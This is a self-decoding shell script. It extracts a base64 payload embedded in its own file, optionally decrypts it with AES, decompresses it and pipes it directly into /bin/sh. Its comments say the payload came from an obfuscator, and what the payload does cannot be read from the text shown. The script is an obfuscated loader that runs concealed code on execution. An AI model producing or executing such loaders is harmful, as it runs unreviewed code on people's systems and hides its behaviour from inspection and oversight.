#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
mtTsFHsU+vOf9yid5G8YAAA=
__OBF_B64_PAYLOAD_END__
